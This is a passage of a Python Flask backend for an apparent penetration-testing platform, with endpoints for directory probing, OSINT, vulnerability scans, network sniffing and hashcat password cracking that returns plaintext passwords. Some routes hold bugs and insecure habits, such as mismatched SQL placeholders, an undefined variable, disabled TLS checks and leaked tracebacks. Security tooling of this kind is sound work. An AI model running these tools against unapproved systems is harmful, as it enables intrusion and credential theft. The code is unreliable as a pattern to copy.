        return None

def check_ssl_tls(url):
    """Check SSL/TLS certificate details using Python only."""
    import ssl
    import socket
    from urllib.parse import urlparse
    vulnerabilities = []
    try:
        # Extract hostname and port
        parsed = urlparse(url if url.startswith('https://') else 'https://' + url)
        hostname = parsed.hostname
        port = parsed.port or 443
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
            s.settimeout(10)
            s.connect((hostname, port))
            cert = s.getpeercert()
            # Check expiry
            from datetime import datetime
            not_after = cert.get('notAfter')
            if not_after:
                expire_date = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                if expire_date < datetime.utcnow():
                    vulnerabilities.append({
                        'id': 'CERT_EXPIRED',
                        'finding': 'SSL/TLS certificate has expired',
                        'severity': 'HIGH',
                        'cve': None
                    })
            # Check subject common name
            subject = dict(x[0] for x in cert.get('subject', []))
            if hostname not in subject.get('commonName', hostname):
                vulnerabilities.append({
                    'id': 'CERT_CN_MISMATCH',
                    'finding': 'Certificate common name does not match hostname',
                    'severity': 'MEDIUM',
                    'cve': None
                })
            # Check issuer
            issuer = dict(x[0] for x in cert.get('issuer', []))
            # Add more checks as needed
            return vulnerabilities
    except Exception as e:
        app.logger.error(f"SSL/TLS check error: {e}")
        return [{'id': 'SSL_ERROR', 'finding': str(e), 'severity': 'HIGH', 'cve': None}]


def check_dns_security(domain):
    """Check DNS security settings"""
    checks = {
        'dnssec': False,
        'dmarc': False,
        'dkim': False,
        'spf': False,
        'mx_records': [],
        'txt_records': [],
        'vulnerabilities': []
    }
    
    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 7200  # Set to 2 hours
        resolver.lifetime = 7200
        # Use public DNS servers for reliability
        resolver.nameservers = ['8.8.8.8', '1.1.1.1']
        # Check DNSSEC - handle cases where it's not configured
        try:
            answer = resolver.resolve(domain, 'DNSKEY')
            checks['dnssec'] = bool(answer.rrset)
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers):
            checks['dnssec'] = False
            checks['vulnerabilities'].append('DNSSEC not configured')
        except dns.exception.Timeout:
            checks['dnssec'] = False
            checks['vulnerabilities'].append('DNSSEC check timed out')
        # Check DMARC, DKIM, SPF
        try:
            txt_records = resolver.resolve(domain, 'TXT')
            checks['txt_records'] = [str(r) for r in txt_records]
            for record in txt_records:
                record_str = str(record)
                if 'v=DMARC1' in record_str:
                    checks['dmarc'] = True
                if 'v=DKIM1' in record_str:
                    checks['dkim'] = True
                if 'v=spf1' in record_str:
                    checks['spf'] = True
        except dns.resolver.NoAnswer:
            pass
        # Check MX records
        try:
            mx_records = resolver.resolve(domain, 'MX')
            checks['mx_records'] = [str(r) for r in mx_records]
        except dns.resolver.NoAnswer:
            pass
        # Check for DNS vulnerabilities
        if not checks['spf']:
            checks['vulnerabilities'].append('Missing SPF record')
        if not checks['dmarc']:
            checks['vulnerabilities'].append('Missing DMARC record')
        if not checks['dnssec']:
            checks['vulnerabilities'].append('Missing DNSSEC')
        return checks
    except Exception as e:
        app.logger.error(f"DNS security check error: {e}")
        return checks

def check_web_technology(url):
    """Identify web technologies in use"""
    try:
        headers = requests.get(url, timeout=7200, verify=False).headers
        
        tech = {
            'server': headers.get('Server', ''),
            'x-powered-by': headers.get('X-Powered-By', ''),
            'framework': '',
            'cms': '',
            'languages': []
        }
        
        # Check for common frameworks
        if 'X-Generator' in headers:
            tech['framework'] = headers['X-Generator']
        elif 'Drupal' in headers.get('X-Drupal-Cache', ''):
            tech['cms'] = 'Drupal'
        elif 'wp-json' in requests.get(f"{url}/wp-json", timeout=7200).text:
            tech['cms'] = 'WordPress'
        
        # Check for language indicators
        if 'PHP' in headers.get('X-Powered-By', ''):
            tech['languages'].append('PHP')
        if 'ASP.NET' in headers.get('X-AspNet-Version', ''):
            tech['languages'].append('ASP.NET')
        
        return tech
        
    except Exception as e:
        app.logger.error(f"Web technology check error: {e}")
        return {}

def check_web_directory(url):
    """Check for common web directories"""
    common_dirs = [
        'admin', 'backup', 'config', 'wp-admin', 'wp-content',
        'wp-includes', 'phpmyadmin', 'server-status', 'cgi-bin',
        'includes', 'uploads', 'images', 'js', 'css'
    ]
    
    found = []
    
    try:
        for directory in common_dirs:
            test_url = f"{url}/{directory}"
            response = requests.get(test_url, timeout=7200, verify=False)
            
            if response.status_code == 200:
                found.append({
                    'directory': directory,
                    'status': response.status_code,
                    'size': len(response.text)
                })
                
        return found
        
    except Exception as e:
        app.logger.error(f"Web directory check error: {e}")
        return []

def check_osint(target, job_id=None, email=None):
    """Perform OSINT gathering on target, with optional email checks (EmailRep.io, Socialscan)."""
    osint_data = {
        'whois': {},
        'dns': {},
        'recon': {}
    }
    try:
        # WHOIS lookup
        try:
            import socket
            old_timeout = socket.getdefaulttimeout()
            socket.setdefaulttimeout(7200)  # 2 hours
            try:
                whois_data = whois.whois(target)
                osint_data['whois'] = {
                    k: str(v) if hasattr(v, 'strftime') else v 
                    for k, v in whois_data.items()
                }
            finally:
                socket.setdefaulttimeout(old_timeout)
        except Exception as e:
            app.logger.error(f'WHOIS error: {e}')
            osint_data['whois_error'] = str(e)
        # DNS Security
        domain = target.replace('http://', '').replace('https://', '').split('/')[0]
        osint_data['dns'] = check_dns_security(domain)
        # EmailRep.io and Socialscan
        if email:
            # EmailRep.io
            try:
                resp = requests.get(f'https://emailrep.io/{email}', timeout=30)
                if resp.status_code == 200:
                    osint_data['emailrep'] = resp.json()
                else:
                    osint_data['emailrep'] = {'error': f'EmailRep returned {resp.status_code}'}
            except Exception as e:
                osint_data['emailrep'] = {'error': str(e)}
            # Socialscan
            try:
                from socialscan.util import Platforms
                from socialscan.query import Query
                from socialscan.search import run_queries
                queries = [Query(email=email)]
                results = list(run_queries(queries, [Platforms.EMAIL]))
                osint_data['socialscan'] = [r.to_dict() for r in results]
            except Exception as e:
                osint_data['socialscan'] = {'error': str(e)}
        # Serialize datetimes before saving or returning
        osint_data = serialize_datetimes(osint_data)
        if job_id is not None:
            execute_query(
                """INSERT INTO job_results 
                   (job_id, output_type, content, severity)
                   VALUES (%s, 'osint_data', %s, 'info')""",
                (job_id, json.dumps(osint_data))
            )
        mitre_techniques = ['Gather Victim Host Information', 'Gather Victim Network Information']
        if job_id is not None:
            for technique in map_to_mitre_attack(mitre_techniques):
                if technique:
                    execute_query(
                        """INSERT INTO job_mitre_mappings (job_id, technique_id)
                           VALUES (%s, %s)""",
                        (job_id, technique['technique_id'])
                    )
        return osint_data
    except Exception as e:
        app.logger.error(f"OSINT gathering error: {str(e)}")
        if job_id is not None:
            execute_query(
                "UPDATE jobs SET status = 'failed' WHERE job_id = %s",
                (job_id,)
            )
        raise

@app.route('/api/tools/vulnerability/scan', methods=['POST'])
@jwt_required()
def vulnerability_scan():
    job_id = None
    try:
        current_user = get_jwt_identity()
        claims = get_jwt()
        data = request.get_json(silent=True) or {}

        target = data.get('target')
        scan_type = data.get('scan_type', 'full')
        if not target:
            return jsonify({"error": "Missing required field: target"}), 400

        # Look up or insert target
        target_row = execute_query(
            "SELECT target_id FROM targets WHERE target_value = %s",
            (target,), fetch_one=True
        )
        if target_row:
            target_id = target_row['target_id']
        else:
            target_id = execute_query(
                "INSERT INTO targets (target_value, added_by, created_at) VALUES (%s, %s, %s)",
                (target, current_user, datetime.now())
            )

        # Create job record - ensure this matches your actual database schema
        job_id = execute_query(
            """INSERT INTO jobs (user_id, tool_id, target_id, parameters, status, created_at) 
               VALUES (%s, %s, %s, %s, %s, %s)""",
            (
                current_user, 
                2,  # tool_id for vulnerability scanner
                target_id,  # target_id - now set correctly
                json.dumps({'scan_type': scan_type}),  # parameters
                'running',  # status
                datetime.now()  # created_at
            )
        )

        vulnerabilities = []

        # Example vulnerability checks
        sqli_vuln, sqli_proofs = check_sqli_vulnerability(target)
        if sqli_vuln:
            vulnerabilities.append({
                "type": "SQL Injection",
                "proofs": sqli_proofs
            })

        xss_vuln, xss_proofs = check_xss_vulnerability(target)
        if xss_vuln:
            vulnerabilities.append({
                "type": "Cross-Site Scripting",
                "proofs": xss_proofs
            })

        # Add more checks as needed...

        # Insert vulnerabilities into database
        for vuln in vulnerabilities:
            execute_query(
                "INSERT INTO vulnerabilities (job_id, name, description, severity) VALUES (%s, %s, %s, %s)",
                (job_id, vuln["type"], "; ".join(vuln["proofs"]), "high")
            )

        # Update job status
        execute_query(
            "UPDATE jobs SET status = 'completed', completed_at = %s WHERE job_id = %s",
            (datetime.now().isoformat(), job_id)
        )

        log_activity(current_user, 'vulnerability_scan', 'job', job_id)
        return jsonify({
            "message": "Vulnerability scan completed",
            "job_id": job_id,
            "vulnerabilities_found": len(vulnerabilities),
            "vulnerabilities": vulnerabilities
        }), 200

    except pymysql.err.OperationalError as e:
        # Handle database schema errors specifically
        if "Unknown column" in str(e):
            app.logger.error(f"Database schema error: {e}")
            return jsonify({
                "error": "Database configuration error",
                "details": str(e)
            }), 500
        if job_id is not None:
            execute_query(
                "UPDATE jobs SET status = 'failed' WHERE job_id = %s",
                (job_id,)
            )
        return jsonify({"error": "Database operation failed"}), 500

    except Exception as e:
        if job_id is not None:
            execute_query(
                "UPDATE jobs SET status = 'failed' WHERE job_id = %s",
                (job_id,)
            )
        app.logger.error(f"Vulnerability scan error: {e}")
        return jsonify({"error": "Vulnerability scan failed"}), 500

@app.route('/api/tools/malware/analyze', methods=['POST'])
@jwt_required()
def malware_analysis():
    job_id = None
    try:
        current_user = get_jwt_identity()
        claims = get_jwt()
        data = request.get_json(silent=True) or {}
        if 'file' not in request.files:
            return jsonify({"error": "No file uploaded"}), 400
            
        file = request.files['file']
        if file.filename == '':
            return jsonify({"error": "No selected file"}), 400
            
        # Validate file
        is_valid, message = validate_file_upload(file)
        if not is_valid:
            return jsonify({"error": message}), 400
            
        # Save file
        filename = secure_filename(f"malware_{datetime.now().timestamp()}_{file.filename}")
        file_path = os.path.join(app.config['MALWARE_ANALYSIS_FOLDER'], filename)
        file.save(file_path)
        
        # Create job record
        job_id = execute_query(
            """INSERT INTO jobs (user_id, tool_id, target_id, parameters, status)
               VALUES (%s, (SELECT tool_id FROM tools WHERE name = 'Malware Analyzer'), %s, %s, 'running')""",
            (current_user, None, json.dumps({'filename': filename}))
        )
        
        # Analyze malware
        analysis = analyze_malware(file_path)
        
        if not analysis:
            raise Exception("Malware analysis failed")
        
        # Save results
        execute_query(
            """INSERT INTO results (job_id, tool_name, target, output, status, started_at, finished_at, error_message, extra)
               VALUES (%s, 'malware_analysis', %s, %s, %s, %s, %s, %s, %s)""",
            (
                str(job_id),
                'Malware Analyzer',
                target,
                json.dumps(analysis),
                'done',
                datetime.now().isoformat(),
                datetime.now().isoformat(),
                None,
                json.dumps({})
            )
        )
        
        # Check for suspicious indicators
        if analysis['indicators'] or analysis['pe_analysis'].get('suspicious'):
            execute_query(
                """INSERT INTO vulnerabilities 
                   (job_id, name, description, severity, proof)
                   VALUES (%s, %s, %s, %s)""",
                (
                    str(job_id),
                    'Malicious Indicators Found',
                    'File contains indicators of malicious behavior',
                    'critical',
                    json.dumps({
                        'indicators': analysis['indicators'],
                        'suspicious': analysis['pe_analysis'].get('suspicious', [])
                    })
                )
            )
        
        # Map to MITRE ATT&CK
        mitre_techniques = ['Malicious File', 'User Execution']
        for technique in map_to_mitre_attack(mitre_techniques):
            execute_query(
                """INSERT INTO job_mitre_mappings (job_id, technique_id)
                   VALUES (%s, %s)""",
                (str(job_id), technique['technique_id'])
            )
        
        # Update job status
        execute_query(
            "UPDATE jobs SET status = 'completed', completed_at = %s WHERE job_id = %s",
            (datetime.now().isoformat(), job_id)
        )
        
        # Clean up
        os.remove(file_path)
        
        log_activity(current_user, 'malware_analysis', 'job', job_id)
        return jsonify({
            "message": "Malware analysis completed",
            "job_id": job_id,
            "analysis": analysis
        }), 200
        
    except Exception as e:
        if job_id is not None:
            execute_query(
                "UPDATE jobs SET status = 'failed' WHERE job_id = %s",
                (job_id,)
            )
        app.logger.error(f"Malware analysis error: {e}")
        return jsonify({"error": "Malware analysis failed"}), 500

@app.route('/api/tools/network/monitor', methods=['POST'])
@jwt_required()
def network_monitor():
    import json
    job_id = None
    try:
        current_user = get_jwt_identity()
        claims = get_jwt()
        data = request.get_json(silent=True) or {}
        # Check permissions
        if claims['role'] != 'admin':
            return jsonify({"error": "Unauthorized"}), 403
        interface = data.get('interface', 'eth0')
        timeout = min(data.get('timeout', 60), app.config['SNIFF_TIMEOUT'])
        # Optionally validate interface and timeout here
        
        # Create job record
        job_id = execute_query(
            """INSERT INTO jobs (user_id, tool_id, target_id, parameters, status)
               VALUES (%s, (SELECT tool_id FROM tools WHERE name = 'Network Monitor'), %s, %s, 'running')""",
            (current_user, None, json.dumps({'interface': interface, 'timeout': timeout}))
        )
        
        # Start network monitoring
        results = monitor_network(timeout)
        
        if not results:
            raise Exception("Network monitoring failed")
        
        # Set target to None (network monitor does not use a target)
        target = None
        # Save results
        execute_query(
            """INSERT INTO results (job_id, tool_name, target, output, status, started_at, finished_at, error_message, extra)
               VALUES (%s, 'network_traffic', %s, %s, %s, %s, %s, %s, %s)""",
            (
                str(job_id),
                target,
                json.dumps(results),
                'done',
                datetime.now().isoformat(),
                datetime.now().isoformat(),
                None,
                json.dumps({'interface': interface, 'timeout': timeout})
            )
        )
        
        
        # Map to MITRE ATT&CK
        mitre_techniques = ['Network Sniffing', 'Traffic Capture']
        mitre_mappings = []
        try:
            for technique in map_to_mitre_attack(mitre_techniques):
                execute_query(
                    """INSERT INTO job_mitre_mappings (job_id, technique_id)
                       VALUES (%s, %s)""",
                    (str(job_id), technique['technique_id'])
                )
                mitre_mappings.append(technique)
        except Exception as e:
            app.logger.error(f"MITRE mapping failed: {e}")
            mitre_mappings = []
        
        # Update job status
        execute_query(
            "UPDATE jobs SET status = 'completed', completed_at = %s WHERE job_id = %s",
            (datetime.now().isoformat(), job_id)
        )
        
        log_activity(current_user, 'network_monitor', 'job', job_id)
        return jsonify({
            "message": "Network monitoring completed",
            "job_id": job_id,
            "results": results if results else {},
            "mitre_mappings": mitre_mappings
        }), 200
        
    except Exception as e:
        if job_id is not None:
            execute_query(
                "UPDATE jobs SET status = 'failed' WHERE job_id = %s",
                (job_id,)
            )
        app.logger.error(f"Network monitoring error: {e}")
        return jsonify({"error": "Network monitoring failed"}), 500

@app.route('/api/tools/osint/gather', methods=['POST'])
@jwt_required()
def osint_gather():
    """
    OSINT gather endpoint.
    Accepts JSON body with 'target' (domain or IP) and/or 'email'.
    Returns OSINT data including WHOIS, DNS, EmailRep.io, and Socialscan results as appropriate.
    """
    job_id = None
    try:
        current_user = get_jwt_identity()
        claims = get_jwt()
        data = request.get_json(silent=True) or {}
        target = data.get('target')
        email = data.get('email')
        if not target and not email:
            return jsonify({"error": "At least one of 'target' or 'email' is required."}), 400

        # Get tool_id for OSINT Gatherer
        tool_row = execute_query(
            "SELECT tool_id FROM tools WHERE name = %s",
            ('OSINT Gatherer',),
            fetch_one=True
        )
        if not tool_row or not tool_row.get('tool_id'):
            app.logger.error("OSINT Gatherer tool not found in database.")
            return jsonify({"error": "OSINT Gatherer tool not found in database. Please contact an administrator."}), 500
        tool_id = tool_row['tool_id']

        target_id = None
        target_value = None
        if target:
            # Validate target
            target_data = validate_target(target)
            if target_data is True:
                target_data = {'target_value': target}
            if not target_data:
                return jsonify({"error": "Target not authorized"}), 403
        target_value = target_data['target_value']
            # Ensure target exists in DB and get target_id
        target_row = execute_query(
            "SELECT target_id FROM targets WHERE target_value = %s",
            (target_value,),
            fetch_one=True
        )
        if target_row and target_row.get('target_id'):
            target_id = target_row['target_id']
        else:
            target_id = execute_query(
                "INSERT INTO targets (target_value, authorization_status, added_by) VALUES (%s, 'approved', %s)",
                (target_value, current_user)
            )

        # Create job record (target_id can be None if only email is provided)
        job_id = execute_query(
            "INSERT INTO jobs (user_id, tool_id, target_id, parameters, status) VALUES (%s, %s, %s, %s, 'running')",
            (current_user, tool_id, target_id, json.dumps({'target': target_value, 'email': email}))
        )

        # Gather OSINT data (target and/or email)
        osint_data = check_osint(target_value, job_id, email=email)
        osint_data.pop('shodan', None)
        # Serialize datetimes before saving or returning
        osint_data = serialize_datetimes(osint_data)
        # Save results
        execute_query(
            "INSERT INTO results (job_id, tool_name, target, output, status, started_at, finished_at, error_message, extra) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)",
            (
                str(job_id),
                'OSINT Gatherer',
                target_value,
                json.dumps(osint_data),
                'done',
                datetime.now().isoformat(),
                datetime.now().isoformat(),
                None,
                json.dumps({'target': target_value, 'email': email})
            )
        )

        # Map to MITRE ATT&CK (only if target is present)
        if target_value:
            mitre_techniques = ['Gather Victim Host Information', 'Gather Victim Network Information']
            for technique in map_to_mitre_attack(mitre_techniques):
                execute_query(
                    "INSERT INTO job_mitre_mappings (job_id, technique_id) VALUES (%s, %s)",
                    (str(job_id), technique['technique_id'])
                )
        
        # Update job status
        execute_query(
            "UPDATE jobs SET status = 'completed', completed_at = %s WHERE job_id = %s",
            (datetime.now().isoformat(), job_id)
        )
        log_activity(current_user, 'osint_gather', 'job', job_id)
        return jsonify({
            "message": "OSINT gathering completed",
            "job_id": job_id,
            "osint_data": osint_data
        }), 200
    except Exception as e:
        if job_id is not None:
            execute_query(
                "UPDATE jobs SET status = 'failed' WHERE job_id = %s",
                (job_id,)
            )
        app.logger.error(f"OSINT gathering error: {e}")
        return jsonify({"error": "OSINT gathering failed"}), 500

@app.route('/api/tools/password/crack', methods=['POST'])
@jwt_required()
def password_crack():
    job_id = None
    try:
        current_user = get_jwt_identity()
        claims = get_jwt()
        data = request.get_json(silent=True) or {}
        # Check permissions
        if claims['role'] not in ['admin', 'analyst']:
            return jsonify({"error": "Unauthorized"}), 403
        hash_value = data.get('hash')
        hash_type = data.get('hash_type')  # md5, sha1, ntlm, etc.
        wordlist_id = data.get('wordlist_id')
        
        if not all([hash_value, hash_type, wordlist_id]):
            return jsonify({"error": "Missing required parameters"}), 400
            
        # Get wordlist path
        wordlist = execute_query(
            "SELECT path FROM wordlists WHERE wordlist_id = %s",
            (wordlist_id,),
            fetch_one=True
        )
        if not wordlist:
            return jsonify({"error": "Invalid wordlist"}), 400
            
        # Create job record
        job_id = execute_query(
            """INSERT INTO jobs (user_id, tool_id, target_id, parameters, status)
               VALUES (%s, (SELECT tool_id FROM tools WHERE name = 'Password Cracker'), %s, %s, 'running')""",
            (current_user, None, json.dumps({
                'hash_type': hash_type,
                'wordlist_id': wordlist_id
            }))
        )
        
        # Determine hashcat mode based on hash type
        hashcat_modes = {
            'md5': 0,
            'sha1': 100,
            'sha256': 1400,
            'sha512': 1700,
            'ntlm': 1000,
            'lm': 3000
        }
        
        mode = hashcat_modes.get(hash_type.lower())
        if mode is None:
            execute_query(
                "UPDATE jobs SET status = 'failed' WHERE job_id = %s",
                (job_id,)
            )
            return jsonify({"error": "Unsupported hash type"}), 400
        
        # Create temporary hash file
        hash_file = f"/tmp/hash_{job_id}.txt"
        with open(hash_file, 'w') as f:
            f.write(hash_value)
        
        # Run Hashcat
        cmd = [
            app.config['HASHCAT_PATH'],
            '-m', str(mode),
            '-a', '0',  # Dictionary attack
            hash_file,
            wordlist['path'],
            '--potfile-disable',
            '--outfile', f"/tmp/hashcat_{job_id}.result",
            '--force'  # Override warnings
        ]
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=7200  # Longer timeout for hash cracking
        )
        
        # Check results
        cracked_password = None
        if os.path.exists(f"/tmp/hashcat_{job_id}.result"):
            with open(f"/tmp/hashcat_{job_id}.result", 'r') as f:
                cracked_password = f.read().strip()
                
            if cracked_password:
                execute_query(
                    """INSERT INTO credentials 
                       (job_id, hash, password, origin, hash_type)
                       VALUES (%s, %s, %s, 'hash_cracking', %s)""",
                    (
                        str(job_id),
                        hash_value,
                        cracked_password,
                        hash_type
                    )
                )
        
        # Update job status
        execute_query(
            "UPDATE jobs SET status = 'completed', completed_at = %s WHERE job_id = %s",
            (datetime.now().isoformat(), job_id)
        )
        
        # Clean up
        os.remove(hash_file)
        if os.path.exists(f"/tmp/hashcat_{job_id}.result"):
            os.remove(f"/tmp/hashcat_{job_id}.result")
        
        log_activity(current_user, 'password_crack', 'job', job_id)
        return jsonify({
            "message": "Password cracking completed",
            "job_id": job_id,
            "cracked": cracked_password is not None,
            "password": cracked_password
        }), 200
        
    except subprocess.TimeoutExpired:
        execute_query(
            "UPDATE jobs SET status = 'failed' WHERE job_id = %s",
            (job_id,)
        )
        return jsonify({"error": "Password cracking timed out"}), 500
    except Exception as e:
        if job_id is not None:
            execute_query(
                "UPDATE jobs SET status = 'failed' WHERE job_id = %s",
                (job_id,)
            )
        app.logger.error(f"Password cracking error: {e}")
        return jsonify({"error": "Password cracking failed"}), 500

@app.route('/api/tools/threat/intel', methods=['POST'])
@jwt_required()
def threat_intel():
    import traceback
    try:
        job_id = None
        current_user = get_jwt_identity()
        claims = get_jwt()
        data = request.get_json(silent=True) or {}
        # Check permissions
        if claims['role'] not in ['admin', 'analyst']:
            return jsonify({"error": "Unauthorized"}), 403
        indicator = data.get('indicator')
        indicator_type = data.get('type')
        if not indicator or not indicator_type:
            return jsonify({"error": "Missing required field: indicator or type"}), 400
        # Create job record
        job_id = execute_query(
            """INSERT INTO jobs (user_id, tool_id, target_id, parameters, status)
               VALUES (%s, (SELECT tool_id FROM tools WHERE name = 'Threat Intelligence'), %s, %s, 'running')""",
            (current_user, None, json.dumps({
                'indicator': indicator,
                'indicator_type': indicator_type
            }))
        )
        # Query threat intelligence sources
        intel_data = {
            'virustotal': {},
            'alienvault_otx': {},
            'mitre_attack': []
        }
        # VirusTotal API
        if app.config['VIRUSTOTAL_API_KEY']:
            try:
                headers = {'x-apikey': app.config['VIRUSTOTAL_API_KEY']}
                if indicator_type == 'ip':
                    url = f"https://www.virustotal.com/api/v3/ip_addresses/{indicator}"
                elif indicator_type == 'domain':
                    url = f"https://www.virustotal.com/api/v3/domains/{indicator}"
                elif indicator_type == 'hash':
                    url = f"https://www.virustotal.com/api/v3/files/{indicator}"
                else:
                    url = f"https://www.virustotal.com/api/v3/urls/{hashlib.sha256(indicator.encode()).hexdigest()}"
                response = requests.get(url, headers=headers, timeout=7200)
                intel_data['virustotal'] = response.json()
            except Exception as e:
                app.logger.error(f"VirusTotal API error: {e}")
                intel_data['virustotal']['error'] = str(e)
        # AlienVault OTX API
        if app.config['ALIENVAULT_OTX_KEY']:
            try:
                headers = {'X-OTX-API-KEY': app.config['ALIENVAULT_OTX_KEY']}
                if indicator_type == 'ip':
                    url = f"https://otx.alienvault.com/api/v1/indicators/IPv4/{indicator}/general"
                elif indicator_type == 'domain':
                    url = f"https://otx.alienvault.com/api/v1/indicators/domain/{indicator}/general"
                elif indicator_type == 'hash':
                    url = f"https://otx.alienvault.com/api/v1/indicators/file/{indicator}/general"
                else:
                    url = f"https://otx.alienvault.com/api/v1/indicators/url/{indicator}/general"
                response = requests.get(url, headers=headers, timeout=7200)
                intel_data['alienvault_otx'] = response.json()
            except Exception as e:
                app.logger.error(f"AlienVault OTX API error: {e}")
                intel_data['alienvault_otx']['error'] = str(e)
        # MITRE ATT&CK mapping
        if indicator_type == 'hash':
            intel_data['mitre_attack'] = map_to_mitre_attack(['Malicious File'])
        elif indicator_type in ['ip', 'domain']:
            intel_data['mitre_attack'] = map_to_mitre_attack(['Command and Control'])
        # Hardcoded insert for debugging
        import pymysql
        now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        conn = get_db_connection()
        try:
            with conn.cursor() as cursor:
                sql = f"""
                    INSERT INTO results (job_id, tool_name, status, started_at, finished_at)
                    VALUES ({int(job_id)}, 'threat_intel', 'done', '{now_str}', '{now_str}')
                """
                print('SQL:', sql)
                cursor.execute(sql)
            conn.commit()
        finally:
            conn.close()
        # ... rest of the endpoint ...
        # For now, just return success for debugging
        return jsonify({"message": "Threat intelligence completed (debug)", "job_id": job_id, "intel_data": intel_data}), 200
    except Exception as e:
        import traceback
        print("EXCEPTION:", e)
        print(traceback.format_exc())
        app.logger.error(f"Threat intelligence error: {e}")
        return jsonify({"error": "Threat intelligence failed", "details": str(e), "trace": traceback.format_exc()}), 500

# Admin Endpoints

@app.route('/api/admin/targets/<int:target_id>/approve', methods=['POST'])
@jwt_required()
def admin_approve_target(target_id):
    claims = get_jwt()
    if claims.get('role') != 'admin':
        return jsonify({"error": "Unauthorized"}), 403
    try:
        # Approve the target
        result = execute_query(
            "UPDATE targets SET authorization_status = 'approved' WHERE target_id = %s",
            (target_id,)
        )
        if result is None:
            return jsonify({"error": "Target not found or update failed"}), 404
        log_activity(claims['sub'], 'approve_target', 'target', target_id)
        return jsonify({"message": "Target approved successfully"}), 200
    except Exception as e:
        app.logger.error(f"Admin approve target error: {e}")
        return jsonify({"error": "Failed to approve target"}), 500

@app.route('/api/admin/users', methods=['GET'])
@jwt_required()
def admin_get_users():
    try:
        claims = get_jwt()
        app.logger.info(f"Admin get users JWT: {claims}")
        if not claims or claims.get('role') != 'admin':
            return jsonify({"error": "Unauthorized"}), 403
        try:
            users = execute_query(
            "SELECT user_id, username, email, role, is_active, created_at, last_login FROM users"
        )
        except Exception as db_err:
            app.logger.error(f"Database error: {db_err}")
            return jsonify({"error": "Database error"}), 500
        return jsonify({"users": users}), 200
    except Exception as e:
        app.logger.error(f"Admin users error: {e}")
        return jsonify({"error": "Failed to get users"}), 500

@app.route('/api/admin/users/<int:user_id>', methods=['PUT'])
@jwt_required()
def admin_update_user(user_id):
    try:
        claims = get_jwt()
        if claims['role'] != 'admin':
            return jsonify({"error": "Unauthorized"}), 403
            
        data = request.get_json()
        role = data.get('role')
        is_active = data.get('is_active')
        
        if role not in ['admin', 'analyst', 'user']:
            return jsonify({"error": "Invalid role"}), 400
            
        execute_query(
            "UPDATE users SET role = %s, is_active = %s WHERE user_id = %s",
            (role, is_active, user_id)
        )
        
        log_activity(claims['sub'], 'update_user', 'user', user_id)
        return jsonify({"message": "User updated successfully"}), 200
        
    except Exception as e:
        app.logger.error(f"Admin update user error: {e}")
        return jsonify({"error": "Failed to update user"}), 500

@app.route('/api/admin/jobs', methods=['GET'])
@jwt_required()
def admin_get_jobs():
    try:
        claims = get_jwt()
        if claims['role'] != 'admin':
            return jsonify({"error": "Unauthorized"}), 403
            
        jobs = execute_query(
            """SELECT j.job_id, j.status, j.created_at, j.completed_at, 
                      u.username, t.name as tool_name, tg.target_value
               FROM jobs j
               JOIN users u ON j.user_id = u.user_id
               JOIN tools t ON j.tool_id = t.tool_id
               LEFT JOIN targets tg ON j.target_id = tg.target_id
               ORDER BY j.created_at DESC
               LIMIT 100"""
        )
        
        return jsonify({"jobs": jobs}), 200
        
    except Exception as e:
        app.logger.error(f"Admin jobs error: {e}")
        return jsonify({"error": "Failed to get jobs"}), 500

@app.route('/api/admin/jobs/<int:job_id>', methods=['GET'])
@jwt_required()
def admin_get_job_details(job_id):
    try:
        claims = get_jwt()
        if claims['role'] != 'admin':
            return jsonify({"error": "Unauthorized"}), 403
            
        job = execute_query(
            """SELECT j.*, u.username, t.name as tool_name, tg.target_value
               FROM jobs j
               JOIN users u ON j.user_id = u.user_id
               JOIN tools t ON j.tool_id = t.tool_id
               LEFT JOIN targets tg ON j.target_id = tg.target_id
               WHERE j.job_id = %s""",
            (job_id,),
            fetch_one=True
        )
        
        if not job:
            return jsonify({"error": "Job not found"}), 404
            
        results = execute_query(
            "SELECT * FROM job_results WHERE job_id = %s",
            (job_id,)
        )
        
        vulnerabilities = execute_query(
            "SELECT * FROM vulnerabilities WHERE job_id = %s",
            (job_id,)
        )
        
        mitre_mappings = execute_query(
            """SELECT t.name as technique_name, t.external_id as technique_id, 
                      t.url, t.description
               FROM mitre_techniques t
               JOIN job_mitre_mappings m ON t.technique_id = m.technique_id
               WHERE m.job_id = %s""",
            (job_id,)
        )
        
        return jsonify({
            "job": job,
            "results": results,
            "vulnerabilities": vulnerabilities,
            "mitre_mappings": mitre_mappings
        }), 200
        
    except Exception as e:
        app.logger.error(f"Admin job details error: {e}")
        return jsonify({"error": "Failed to get job details"}), 500

@app.route('/api/admin/jobs/<int:job_id>/cancel', methods=['POST'])
@jwt_required()
def admin_cancel_job(job_id):
    try:
        claims = get_jwt()
        if claims['role'] != 'admin':
            return jsonify({"error": "Unauthorized"}), 403
            
        # Update job status
        execute_query(
            "UPDATE jobs SET status = 'cancelled' WHERE job_id = %s",
            (job_id,)
        )
        
        log_activity(claims['sub'], 'cancel_job', 'job', job_id)
        return jsonify({"message": "Job cancelled"}), 200
        
    except Exception as e:
        app.logger.error(f"Cancel job error: {e}")
        return jsonify({"error": "Failed to cancel job"}), 500

@app.route('/api/admin/audit/logs', methods=['GET'])
@jwt_required()
def admin_get_audit_logs():
    try:
        claims = get_jwt()
        if claims['role'] != 'admin':
            return jsonify({"error": "Unauthorized"}), 403
            
        logs = execute_query(
            """SELECT l.*, u.username 
               FROM audit_logs l
               JOIN users u ON l.user_id = u.user_id
               ORDER BY l.timestamp DESC
               LIMIT 100"""
        )
        
        return jsonify({"logs": logs}), 200
        
    except Exception as e:
        app.logger.error(f"Admin audit logs error: {e}")
        return jsonify({"error": "Failed to get audit logs"}), 500

@app.route('/api/jobs', methods=['GET'])
@jwt_required()
def get_jobs():
    try:
        current_user = get_jwt_identity()
        app.logger.info(f"JWT identity: {current_user}")
        if not current_user:
            app.logger.error("JWT identity missing or invalid.")
            return jsonify({"error": "Unauthorized: JWT missing or invalid"}), 401

        # Pagination
        try:
            page = int(request.args.get('page', 1))
        except Exception:
            page = 1
        try:
            per_page = int(request.args.get('per_page', 10))
        except Exception:
            per_page = 10
        app.logger.info(f"Pagination params: page={page}, per_page={per_page}")

        jobs = execute_query(
